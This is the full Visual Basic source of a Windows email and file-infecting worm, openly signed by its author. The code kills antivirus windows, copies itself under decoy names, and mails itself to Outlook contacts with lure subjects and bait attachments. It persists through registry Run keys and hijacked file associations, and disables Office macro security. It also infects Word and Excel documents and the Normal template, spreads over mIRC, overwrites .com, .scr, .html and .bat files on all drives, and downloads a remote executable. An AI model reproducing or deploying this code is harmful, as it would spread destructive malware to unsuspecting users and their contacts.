   Attribute VB_Name = "Module1"
   Option Explicit
   Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
    Private Declare Function FindWindow Lib "user32" _
            Alias "FindWindowA" _
            (ByVal lpClassName As String, _
            ByVal lpWindowName As String) As Long
   Private Declare Function SystemParametersInfo Lib _
   "user32" Alias "SystemParametersInfoA" (ByVal uAction _
   As Long, ByVal uParam As Long, ByVal lpvParam As Any, _
   ByVal fuWinIni As Long) As Long
         Private Declare Function PostMessage Lib "user32" _
            Alias "PostMessageA" _
            (ByVal hwnd As Long, _
            ByVal wMsg As Long, _
            ByVal wParam As Long, _
            ByVal lParam As Long) As Long
            Const WM_CLOSE = &H10
   Sub Main()
   On Error Resume Next
   Dim xx, xx1, yy, yy1, zz, zz1, ph1, ph2, ph3, ph16, ph4, ph18, ph5, ph6, ph17, ph7, ph8, ph9, ph10, ph11, ph12, ph13, ph14, g, a, b, y, d, x, c, e, oo, fso, f, pg, pg1, attr, ph15
   Dim avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12
   Dim num3, arrr3, av, num, attch, arrr, subj, subj1, subj2, subj3, subj4, subj5, subj6, punk5, ska, bod, bod1, bod2, bod3, bod4, bod5, punk, ska1
   Dim ex, ex1, ex2, ex3, ex4, ex5, punk1, ska2, sc, sc1, sc2, sc3, sc4, sc5, punk2, ska3, co, co1, co2, co3, co4, punk3, ska4, num1, arrr1, attch1, num2, arrr2, attch2
   Dim aWindow As Long
   Dim angReturnValue As Long
   Dim xtasy As Long
   avn = "Pop3trap"
   avn1 = "JavaScan"
   avn2 = "Modem Booster"
   avn3 = "vettray"
   avn4 = "Timer"
   avn5 = "CD-Rom Monitor"
   avn6 = "F-STOPW Version 5.06c"
   avn7 = "PC-cillin 2000 : Virus Alert"
   avn8 = "DAPDownloadManager"
   avn9 = "Real-time Scan"
   avn10 = "IOMON98"
   avn11 = "AVP Monitor"
   avn12 = "NAI_VS_STAT"
   For num3 = 0 To 12
   arrr3 = Array(avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12)
   av = arrr3(num3)
   aWindow = FindWindow(vbNullString, av)
   angReturnValue = PostMessage(aWindow, WM_CLOSE, vbNull, vbNull)
   Next num3
   xtasy = SystemParametersInfo(97, True, CStr(1), 0)
   xx = App.Path & "\" & App.EXEName & ".EXE"
   xx1 = App.Path & App.EXEName & ".EXE"
   yy = App.Path & "\" & App.EXEName & ".SCR"
   yy1 = App.Path & App.EXEName & ".SCR"
   zz = App.Path & App.EXEName & ".COM"
   zz1 = App.Path & "\" & App.EXEName & ".COM"
   ph1 = "c:\windows.scr"
   ph2 = "c:\winstart.com"
   ph3 = "c:\windows.exe"
   ph4 = "c:\windows\scanregw.exe"
   ph5 = "c:\windows\windows.exe"
   ph6 = "c:\windows\tuneup.exe"
   ph7 = "c:\windows\rundll64.exe"
   ph8 = "c:\windows\system\regsvr32.exe"
   ph9 = "c:\movie.exe"
   ph10 = "c:\screenxx.scr"
   ph11 = "c:\file1980.com"
   ph16 = "c:\disney.scr"
   ph12 = "c:\windows\regedit.exe"
   ph13 = "c:\msmsgs.exe"
   ph18 = "c:\porno.scr"
   ph14 = "c:\hacktool.co_"
   ph17 = "c:\recycled\alco.com"
   ph15 = "C:\Program Files\KaZaA\My Shared Folder\pornview.exe"
   For num = 0 To 3
   arrr = Array(ph9, ph10, ph11, ph16)
   attch = arrr(num)
   FileCopy xx, attch
   FileCopy xx1, attch
   FileCopy yy, attch
   FileCopy yy1, attch
   FileCopy zz, attch
   FileCopy zz1, attch
   Next num
   subj = "i've got cool stuffs here..."
   subj1 = "nice stuffs i got here..."
   subj2 = "check this out..."
   subj3 = "i want you to know how much i care for you..."
   subj4 = "hello! i'm your long, lost friend..."
   subj5 = "talk to me... tell me your name..."
   subj6 = "kindness is a virtue..."
   punk5 = Array(subj, subj1, subj2, subj3, subj4, subj5, subj6)
   Randomize
   ska = punk5(Int(Rnd * 7))
   bod = ".... hi, friend... here are some nice stuffs that i got from the internet... check it out..."
   bod1 = ".... hmmmn... i guess you've forgotten me... but anyways, i wanna make up... here are the files that made me like the internet more... see for yourself..."
   bod2 = ".... check this out..."
   bod3 = ".... three files for you to keep... always remember that i'm into deep... i don't know you but i think i'm in love..."
   bod4 = ".... sharing files is the essence of living... check this out..."
   bod5 = ".... one of the files is a virus... can you tell me which one is it? hehehe, i'm only joking... your friend, paul.."
   punk = Array(bod, bod1, bod2, bod3, bod4, bod5)
   Randomize
   ska1 = punk(Int(Rnd * 6))
   ex = "amateur porn film.mpg"
   ex1 = "jenna jameson clip.mpg"
   ex2 = "lord of the rings clip.mpg"
   ex3 = "fuck of the month.mpg"
   ex4 = "britney exposed.mpg"
   ex5 = "chinese fuck.mpg"
   punk1 = Array(ex, ex1, ex2, ex3, ex4, ex5)
   Randomize
   ska2 = punk1(Int(Rnd * 6))
   sc = "kamasutra screensaver"
   sc1 = "donald and minnie sex.scr"
   sc2 = "baby dancing.scr"
   sc3 = "universe.scr"
   sc4 = "solarsystem.scr"
   sc5 = "shit.scr"
   punk2 = Array(sc, sc1, sc2, sc3, sc4, sc5)
   Randomize
   ska3 = punk2(Int(Rnd * 6))
   co = "credit card hacktool"
   co1 = "patch1981.com"
   co2 = "http://www.meditation.com"
   co3 = "hack mirc server"
   co4 = "windows xp ultimate crack"
   punk3 = Array(co, co1, co2, co3, co4)
   Randomize
   ska4 = punk3(Int(Rnd * 5))
   Set a = CreateObject("Outlook.Application")
   Set b = a.GetNameSpace("MAPI")
   If a = "Outlook" Then
   b.Logon "profile", "password"
   For y = 1 To b.AddressLists.Count
   Set d = b.AddressLists(y)
   x = 1
   Set c = a.CreateItem(0)
   For oo = 1 To d.AddressEntries.Count
   e = d.AddressEntries(x)
   c.Recipients.Add e
   x = x + 1
   If x > 101 Then oo = d.AddressEntries.Count
   Next oo
   c.Subject = ska
   c.Body = ska1
   c.attachments.Add ph9, 1, 1, ska2
   c.attachments.Add ph11, 1, 2, ska4
   c.attachments.Add ph10, 1, 3, ska3
   c.attachments.Add ph16, 1, 4, "disney.scr"
   c.Send
   e = ""
   Next y
   b.Logoff
   End If
   For num1 = 0 To 13
   arrr1 = Array(ph1, ph2, ph3, ph4, ph5, ph6, ph7, ph8, ph12, ph13, ph14, ph15, ph17, ph18)
   attch1 = arrr1(num1)
   FileCopy xx, attch1
   FileCopy xx1, attch1
   FileCopy yy, attch1
   FileCopy yy1, attch1
   FileCopy zz, attch1
   FileCopy zz1, attch1
   Next num1
   For num2 = 0 To 6
   arrr2 = Array(ph1, ph2, ph3, ph5, ph7, ph13, ph17, ph18)
   attch2 = arrr2(num2)
   attr = GetAttr(attch2)
   If attr <> 3 Then
   SetAttr attch2, vbHidden + vbReadOnly
   End If
   Next num2
   Set g = CreateObject("WScript.Shell")
   g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\*Rundll64", ph7
   g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*Regedit", ph12
   g.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MSMSGS", ph13
   g.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\*Windows", ph5
   g.regwrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command\", ph8
   g.regwrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open2\Command\", ph6
   g.regwrite "HKEY_CLASSES_ROOT\mp3file\shell\open\command\", ph4
   g.regwrite "HKEY_CLASSES_ROOT\mp3file\shell\play\command\", ph8
   g.regwrite "HKEY_CLASSES_ROOT\JSFile\Shell\Open\Command\", ph4
   g.regwrite "HKEY_CLASSES_ROOT\JSFile\Shell\Open2\Command\", ph6
   g.regwrite "HKEY_CLASSES_ROOT\txtfile\shell\open\command\", ph17
   Open "c:\v.reg" For Output As 2
   Print #2, "REGEDIT4"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, """AccessVBOM""=dword:00000001"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Excel\Security]"
   Print #2, """Level""=dword:00000001"
   Print #2, """AccessVBOM""=dword:00000001"
   Close 2
   Shell "regedit /s c:\v.reg", vbHide
   Call foldme
   If Dir("c:\Program Files\CurlySoft", vbDirectory) = "" Then
   MkDir "c:\Program Files\CurlySoft"
   pg = "c:\Program Files\CurlySoft\pornview.exe"
   pg1 = "c:\Program Files\CurlySoft\viewer.dll"
   Open "c:\Program Files\CurlySoft\start.bat" For Output As 7
   Print #7, "@echo off"
   Print #7, "ctty nul"
   Print #7, "copy c:\""Program Files""\""CurlySoft""\viewer.dll c:\""Program Files""\""CurlySoft""\run.com"
   Print #7, "regedit /s c:\v.reg"
   Print #7, "c:\file1980.com"
   Close 7
   Open "c:\Program Files\CurlySoft\readme.txt" For Output As 4
   Print #4, "PornViewer v.1.01"
   Print #4, """PORNO STILL SELLS..."""
   Close 4
   FileCopy ph3, pg
   FileCopy ph3, pg1
   End If
   Open "c:\blank.html" For Output As 5
   Print #5, "<HTML>"
   Print #5, "Windows is optimizing files..."
   Print #5, "Click <A HREF=""file://c:\windows\tuneup.exe"" TARGET=""_top"""
   Print #5, "TITLE=""file://c:\windows\tuneup.exe"">here</A> to start..."
   Print #5, "</HTML>"
   Print #5, "<SCRIPT LANGUAGE=""VBScript"">"
   Print #5, "<!--"
   Print #5, "On Error Resume Next"
   Print #5, "Dim a"
   Print #5, "Set a = CreateObject(""WScript.Shell"")"
   Print #5, "a.run(""c:\windows\windows.exe"")"
   Print #5, "-->"
   Print #5, "</SCRIPT>"
   Close 5
   If Dir("c:\Program Files\mIRC", vbDirectory) <> "" Then
   Open "c:\Program Files\mIRC\script.ini" For Output As 3
   Print #3, "[script]"
   Print #3, "n0= on 1:TEXT:*hello*:#:{"
   Print #3, "n1= /if ( $nick == $me ) { halt }"
   Print #3, "n2= /msg $nick Hello.. Do you wanna hack a channel of your choice?.. Here's a nice utility.. Rename the extension to .com and you're set.."
   Print #3, "n3= /dcc send -c $nick c:\hacktool.co_"
   Print #3, "n4= }"
   Print #3, "n5= on 1:JOIN:#:{"
   Print #3, "n6= /if ( $nick == $me ) { halt }"
   Print #3, "n7= /msg $nick Hello.. Do you wanna hack a channel of your choice?.. Here's a nice utility.. Rename the extension to .com and you're set.."
   Print #3, "n8= /dcc send -c $nick c:\hacktool.co_"
   Print #3, "n9= }"
   Print #3, "n10= on 1:PART:#:{"
   Print #3, "n11= /if ( $nick == $me ) { halt }"
   Print #3, "n12= /msg $nick Hello.. Do you wanna hack a channel of your choice?.. Here's a nice utility.. Rename the extension to .com and you're set.."
   Print #3, "n13= /dcc send -c $nick c:\hacktool.co_"
   Print #3, "n14= }"
   Close 3
   If Dir("c:\mIRC", vbDirectory) <> "" Then
   FileCopy "c:\Program Files\mIRC\script.ini", "c:\mIRC\script.ini"
   End If
   End If
   Call norm
   Call shortie
   Call werd
   Call update
   Call dribe
   Call xcel
   Call tym
   Call sndPlaySound("c:\windows\media\tada.wav", 0)
   If Dir("c:\acs.acs") <> "acs.acs" Then
   Open "c:\acs.acs" For Output As 1
   Print #1, "another one bites the dust"
   Close 1
   MsgBox "You've Been Hit By, You've Been Struck By, The Smooth Criminal... Again... AW!...", vbSystemModal, "Yet Another Multifaceted Creation From The Booze Authority"
   End If
   End Sub
   Sub update()
   On Error Resume Next
   Shell "start http://members.tripod.com/curlysoft/HTMLobj-61/update.exe", vbHide
   Open "c:\v.vbs" For Output As 2
   Print #2, "Dim sh"
   Print #2, "Set sh = CreateObject(""WScript.Shell"")"
   Print #2, "Do Until sh.AppActivate(""File Download"")"
   Print #2, "Loop"
   Print #2, "sh.sendkeys ""%O"""
   Close 2
   Shell "start c:\v.vbs", vbHide
   End Sub
   Sub werd()
   On Error Resume Next
   If Dir("c:\porno.doc") <> "porno.doc" Then
   Dim fso, oword, odoc, nt, iw, i, b
   Open "c:\doc.wps" For Output As 9
   Print #9, "Sub document_open()"
   Print #9, "On Error Resume Next"
   Print #9, "Dim a, b, y, d, x, c, e, oo, fso, f, j, obj"
   Print #9, "Set a = CreateObject(""Outlook.Application"")"
   Print #9, "Set b = a.GetNameSpace(""MAPI"")"
   Print #9, "If a = ""Outlook"" Then"
   Print #9, "b.Logon ""profile"", ""password"""
   Print #9, "For y = 1 To b.AddressLists.Count"
   Print #9, "Set d = b.AddressLists(y)"
   Print #9, "x = 1"
   Print #9, "Set c = a.CreateItem(0)"
   Print #9, "For oo = 1 To d.AddressEntries.Count"
   Print #9, "e = d.AddressEntries(x)"
   Print #9, "c.Recipients.Add e"
   Print #9, "x = x + 1"
   Print #9, "If x > 101 Then oo = d.AddressEntries.Count"
   Print #9, "Next oo"
   Print #9, "c.Subject = ""Nice Embedded Object"""
   Print #9, "c.Body = ""Check out the embedded object in the word document..."""
   Print #9, "c.attachments.Add ActiveDocument.FullName"
   Print #9, "c.Send"
   Print #9, "e = """""
   Print #9, "Next y"
   Print #9, "b.Logoff"
   Print #9, "End If"
   Print #9, "obj = ActiveDocument.Shapes(1).OLEFormat.ClassType"
   Print #9, "With ActiveDocument.Shapes(1).OLEFormat"
   Print #9, "    .ActivateAs ClassType:=obj"
   Print #9, "    .Activate"
   Print #9, "End With"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFile(ActiveDocument.FullName)"
   Print #9, "f.Copy(""c:\windows\topsecret.doc"")"
   Print #9, "Call haha"
   Print #9, "Set j = Assistant.NewBalloon"
   Print #9, "With j"
   Print #9, ".Heading = ""alcopaul says"""
   Print #9, ".Text = ""E-mail me..."""
   Print #9, "returnValue = .Show"
   Print #9, "End With"
   Print #9, "End Sub"
   Print #9, "Sub haha()"
   Print #9, "On Error Resume Next"
   Print #9, "Dim d, dc, s, fso, haha"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set dc = fso.Drives"
   Print #9, "For Each d In dc"
   Print #9, "If d.DriveType = 2 Or d.DriveType = 3 Then"
   Print #9, "hihi (d.Path & ""\"")"
   Print #9, "End If"
   Print #9, "Next"
   Print #9, "haha = s"
   Print #9, "End Sub"
   Print #9, "Sub hehe(folderspec)"
   Print #9, "On Error Resume Next"
   Print #9, "Dim f, f1, fc, ext, s, fso"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFolder(folderspec)"
   Print #9, "Set fc = f.Files"
   Print #9, "For Each f1 In fc"
   Print #9, "ext = fso.GetExtensionName(f1.Path)"
   Print #9, "ext = LCase(ext)"
   Print #9, "s = LCase(f1.Name)"
   Print #9, "If (ext = ""doc"") Then"
   Print #9, "Set f = fso.GetFile(ActiveDocument.FullName)"
   Print #9, "f.Copy (f1.Path)"
   Print #9, "End If"
   Print #9, "Next"
   Print #9, "End Sub"
   Print #9, "Sub hihi(folderspec)"
   Print #9, "On Error Resume Next"
   Print #9, "Dim f, f1, sf, fso"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFolder(folderspec)"
   Print #9, "Set sf = f.SubFolders"
   Print #9, "For Each f1 In sf"
   Print #9, "hehe (f1.Path)"
   Print #9, "hihi (f1.Path)"
   Print #9, "Next"
   Print #9, "End Sub"
   Close 9
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set oword = CreateObject("Word.Application")
   oword.Visible = False
   Set odoc = oword.Documents.Add
   Set nt = oword.ActiveDocument.vbproject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile("c:\doc.wps", 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   oword.ActiveDocument.Shapes.AddOLEObject _
       FileName:="c:\porno.scr", _
       LinkToFile:=False
   oword.ActiveDocument.SaveAs FileName:="c:\porno.doc"
   oword.ActiveDocument.SaveAs FileName:="c:\windows\newdocument.doc"
   oword.ActiveDocument.Close
   End If
   End Sub
   Sub xcel()
   On Error Resume Next
   If Dir("c:\xxxmovie.xls") <> "xxxmovie.xls" Then
   Dim fso, oword, odoc, nt, iw, i, b
   Open "c:\xls.wps" For Output As 9
   Print #9, "Sub Workbook_Open()"
   Print #9, "On Error Resume Next"
   Print #9, "Dim a, b, y, d, x, c, e, oo, fso, f, j"
   Print #9, "Set a = CreateObject(""Outlook.Application"")"
   Print #9, "Set b = a.GetNameSpace(""MAPI"")"
   Print #9, "If a = ""Outlook"" Then"
   Print #9, "b.Logon ""profile"", ""password"""
   Print #9, "For y = 1 To b.AddressLists.Count"
   Print #9, "Set d = b.AddressLists(y)"
   Print #9, "x = 1"
   Print #9, "Set c = a.CreateItem(0)"
   Print #9, "For oo = 1 To d.AddressEntries.Count"
   Print #9, "e = d.AddressEntries(x)"
   Print #9, "c.Recipients.Add e"
   Print #9, "x = x + 1"
   Print #9, "If x > 101 Then oo = d.AddressEntries.Count"
   Print #9, "Next oo"
   Print #9, "c.Subject = ""Nice Embedded Object"""
   Print #9, "c.Body = ""Check out the embedded object in the excel sheet..."""
   Print #9, "c.attachments.Add ActiveWorkbook.FullName"
   Print #9, "c.Send"
   Print #9, "e = """""
   Print #9, "Next y"
   Print #9, "b.Logoff"
   Print #9, "End If"
   Print #9, "Worksheets(1).Shapes(1).OLEFormat.Activate"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFile(ActiveWorkbook.FullName)"
   Print #9, "f.Copy(""c:\topsecret.xls"")"
   Print #9, "Call haha"
   Print #9, "Set j = Assistant.NewBalloon"
   Print #9, "With j"
   Print #9, ".Heading = ""alcopaul says"""
   Print #9, ".Text = ""E-mail me..."""
   Print #9, "returnValue = .Show"
   Print #9, "End With"
   Print #9, "End Sub"
   Print #9, "Sub haha()"
   Print #9, "On Error Resume Next"
   Print #9, "Dim d, dc, s, fso, haha"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set dc = fso.Drives"
   Print #9, "For Each d In dc"
   Print #9, "If d.DriveType = 2 Or d.DriveType = 3 Then"
   Print #9, "hihi (d.Path & ""\"")"
   Print #9, "End If"
   Print #9, "Next"
   Print #9, "haha = s"
   Print #9, "End Sub"
   Print #9, "Sub hehe(folderspec)"
   Print #9, "On Error Resume Next"
   Print #9, "Dim f, f1, fc, ext, s, fso"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFolder(folderspec)"
   Print #9, "Set fc = f.Files"
   Print #9, "For Each f1 In fc"
   Print #9, "ext = fso.GetExtensionName(f1.Path)"
   Print #9, "ext = LCase(ext)"
   Print #9, "s = LCase(f1.Name)"
   Print #9, "If (ext = ""xls"") Then"
   Print #9, "Set f = fso.GetFile(ActiveWorkbook.FullName)"
   Print #9, "f.Copy (f1.Path)"
   Print #9, "End If"
   Print #9, "Next"
   Print #9, "End Sub"
   Print #9, "Sub hihi(folderspec)"
   Print #9, "On Error Resume Next"
   Print #9, "Dim f, f1, sf, fso"
   Print #9, "Set fso = CreateObject(""Scripting.FileSystemObject"")"
   Print #9, "Set f = fso.GetFolder(folderspec)"
   Print #9, "Set sf = f.SubFolders"
   Print #9, "For Each f1 In sf"
   Print #9, "hehe (f1.Path)"
   Print #9, "hihi (f1.Path)"
   Print #9, "Next"
   Print #9, "End Sub"
   Close 9
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set oword = CreateObject("Excel.Application")
   oword.Visible = False
   Set odoc = oword.workbooks.Add
   Set nt = oword.ActiveWorkbook.vbproject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile("c:\xls.wps", 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   oword.Worksheets(1).Shapes.AddOLEObject Left:=100, Top:=100, _
       Width:=200, Height:=300, _
       FileName:="c:\porno.scr", link:=False
   oword.ActiveWorkbook.SaveAs FileName:="c:\xxxmovie.xls"
   oword.ActiveWorkbook.Close
   End If
   End Sub
   Sub foldme()
   On Error Resume Next
   Dim a, b, c, d, e, f, g, ph3, num, ver, flx, j, ddd, dr1
   ph3 = "c:\windows.exe"
   Set a = CreateObject("WScript.Shell")
   d = a.SpecialFolders("Programs")
   e = a.SpecialFolders("Desktop")
   f = a.SpecialFolders("Favorites")
   g = a.SpecialFolders("SendTo")
   dr1 = "c:\windows\files"
   MkDir (d & "\XXX Files")
   MkDir (e & "\Top Secret")
   MkDir (f & "\A Beautiful Mind")
   MkDir (g & "\Oceans11")
   FileCopy ph3, d & "\XXX Files\clickme.exe"
   FileCopy ph3, e & "\Top Secret\clickme.exe"
   FileCopy ph3, f & "\A Beautiful Mind\watchme.exe"
   FileCopy ph3, g & "\Oceans11\watchme.exe"
   FileCopy ph3, e & "\win.exe"
   MkDir dr1
   For num = 0 To 4
   ver = (Int(Rnd * 19817) + 100000) & Rnd()
   Randomize
   flx = d & "\Windows Update\file" & ver & num & ".exe"
   ddd = dr1 & "\file" & ver & num & ".exe"
   FileCopy ph3, flx
   FileCopy ph3, ddd
   Set j = CreateObject("WScript.Shell")
   j.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*Windows Update", flx
   Next num
   End Sub
   Sub dribe()
     On Error Resume Next
     Dim d, dc, s, fso, dribe
     Set fso = CreateObject("Scripting.FileSystemObject")
     Set dc = fso.Drives
     For Each d In dc
       If d.DriveType = 2 Or d.DriveType = 3 Then
         fldr (d.Path & "\")
       End If
     Next
     dribe = s
   End Sub
   Sub info(spec)
     On Error Resume Next
     Dim f, f1, fc, ext, ap, mircfname, s, bt, bname, mp3, fso, g, z, x, v, b, j, fa, fe, fi, fo, fu, cop, ht
     Set fso = CreateObject("Scripting.FileSystemObject")
     g = App.Path & "\" & App.EXEName & ".exe"
     z = App.Path & App.EXEName & ".exe"
     x = App.Path & "\" & App.EXEName & ".com"
     v = App.Path & App.EXEName & ".com"
     b = App.Path & App.EXEName & ".scr"
     j = App.Path & "\" & App.EXEName & ".scr"
     ht = "c:\blank.html"
     bt = "c:\Program Files\CurlySoft\start.bat"
     Set f = fso.GetFolder(spec)
     Set fc = f.Files
     For Each f1 In fc
       ext = fso.GetExtensionName(f1.Path)
       ext = LCase(ext)
       s = LCase(f1.Name)
       If (ext = "com") Or (ext = "scr") Then
       If (s = "command.com") Or (s = "win.com") Then
       Else
      Set f = fso.getfile(g)
      f.Copy (f1.Path)
         Set fa = fso.getfile(z)
      fa.Copy (f1.Path)
         Set fe = fso.getfile(x)
      fe.Copy (f1.Path)
         Set fi = fso.getfile(v)
      fi.Copy (f1.Path)
         Set fo = fso.getfile(b)
      fo.Copy (f1.Path)
         Set fu = fso.getfile(j)
      fu.Copy (f1.Path)
   End If
   End If
   If (ext = "html") Or (ext = "htm") Then
      Set f = fso.getfile(ht)
      f.Copy (f1.Path)
   End If
   If (ext = "exe") Then
   If (s = "avpm.exe") Or (s = "_avpm.exe") Or (s = "avp32.exe") Or (s = "_avp32.exe") Or (s = "vshwin32.exe") Or (s = "tasm32.exe") Or (s = "ml.exe") Then
      Set f = fso.getfile(g)
      f.Copy (f1.Path)
         Set fa = fso.getfile(z)
      fa.Copy (f1.Path)
         Set fe = fso.getfile(x)
      fe.Copy (f1.Path)
         Set fi = fso.getfile(v)
      fi.Copy (f1.Path)
         Set fo = fso.getfile(b)
      fo.Copy (f1.Path)
         Set fu = fso.getfile(j)
      fu.Copy (f1.Path)
   Else
   End If
   End If
   If (ext = "bat") Then
      Set f = fso.getfile(bt)
      f.Copy (f1.Path)
   End If
   Next
   End Sub
   Sub fldr(spec)
     On Error Resume Next
     Dim f, f1, sf, fso
       Set fso = CreateObject("Scripting.FileSystemObject")
     Set f = fso.GetFolder(spec)
     Set sf = f.SubFolders
     For Each f1 In sf
       info (f1.Path)
       fldr (f1.Path)
     Next
   End Sub
   Sub shortie()
   On Error Resume Next
   Dim a
   Set a = CreateObject("WScript.Shell")
   Dim b, c, d, e
   d = a.SpecialFolders("Desktop")
   Set b = a.CreateShortcut(d & "\New Document.lnk")
   b.TargetPath = a.ExpandEnvironmentStrings("c:\windows\newdocument.doc")
   b.WorkingDirectory = a.ExpandEnvironmentStrings("c:\windows")
   b.WindowStyle = 4
   b.Save
   Set e = a.CreateShortcut(d & "\Tips On How To Make Your Partner Wilder.lnk")
   e.TargetPath = a.ExpandEnvironmentStrings("c:\xxxmovie.xls")
   e.WorkingDirectory = a.ExpandEnvironmentStrings("c:\")
   e.WindowStyle = 4
   e.Save
   Set c = a.CreateShortcut(d & "\Porn Viewer version 1.01.lnk")
   c.TargetPath = a.ExpandEnvironmentStrings("c:\Program Files\CurlySoft\pornview.exe")
   c.WorkingDirectory = a.ExpandEnvironmentStrings("c:\Program Files\CurlySoft")
   c.WindowStyle = 4
   c.Save
   Open d & "\" & "mailme.url" For Output As 3
   Print #3, "[InternetShortcut]"
   Print #3, "URL=mailto:alcopaul@cannabismail.com"
   Close 3
   Open d & "\" & "ExecuteMe.url" For Output As 6
   Print #6, "[InternetShortcut]"
   Print #6, "URL=c:\windows\rundll64.exe"
   Close 6
   End Sub
   Sub tym()
   On Error Resume Next
   Dim MyTime, MyDate
   MyTime = #12:00:00 AM#
   Time = MyTime
   MyDate = #1/1/1969#
   Date = MyDate
   End Sub
   Sub norm()
   On Error Resume Next
   If Dir("c:\doc.wps") <> "doc.wps" Then
   Dim fso, oword, odoc, nt, iw, i, b
   Open "c:\nor.wps" For Output As 9
   Print #9, "sub document_close()"
   Print #9, "On Error Resume Next"
   Print #9, "ActiveDocument.Shapes.AddOLEObject _"
   Print #9, "    FileName:=""c:\porno.scr"", _"
   Print #9, "    LinkToFile:=False"
   Print #9, "ActiveDocument.Save"
   Print #9, "Open ""c:\vv.reg"" For Output As 2"
   Print #9, "Print #2, ""REGEDIT4"""
   Print #9, "Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"""
   Print #9, "Print #2, """"""Level""""=dword:00000001"""
   Print #9, "Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"""
   Print #9, "Print #2, """"""Level""""=dword:00000001"""
   Print #9, "Print #2, """"""AccessVBOM""""=dword:00000001"""
   Print #9, "Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"""
   Print #9, "Print #2, """"""Level""""=dword:00000001"""
   Print #9, "Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Excel\Security]"""
   Print #9, "Print #2, """"""Level""""=dword:00000001"""
   Print #9, "Print #2, """"""AccessVBOM""""=dword:00000001"""
   Print #9, "Close 2"
   Print #9, "Shell ""regedit /s c:\vv.reg"", vbHide"
   Print #9, "Kill ""c:\vv.reg"""
   Print #9, "End Sub"
   Close 9
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set oword = CreateObject("Word.Application")
   oword.Visible = False
   Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule
   Set iw = fso.OpenTextFile("c:\nor.wps", 1, True)
   nt.DeleteLines 1, nt.CountOfLines
   i = 1
   Do While iw.atendofstream <> True
   b = iw.readline
   nt.InsertLines i, b
   i = i + 1
   Loop
   oword.NormalTemplate.Save
   SetAttr oword.NormalTemplate.Fullname, vbReadOnly
   oword.NormalTemplate.Close
   End If
   End Sub
